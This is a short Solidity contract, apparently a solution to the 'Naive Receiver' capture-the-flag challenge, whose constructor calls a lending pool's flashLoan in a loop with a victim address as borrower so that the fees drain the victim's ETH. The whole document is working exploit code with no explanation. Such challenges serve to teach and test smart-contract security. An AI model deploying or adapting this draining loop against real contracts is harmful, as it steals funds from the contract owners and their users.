// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function flashLoan(address, uint256) external;
}

contract NaiveReceiverChainFlashLoans {

    constructor(address poolAddr, address target) {

        INaiveReceiverLenderPool pool = INaiveReceiverLenderPool(poolAddr);

        while(target.balance >= 1) {
            pool.flashLoan(target, 0);
        }
    }
}
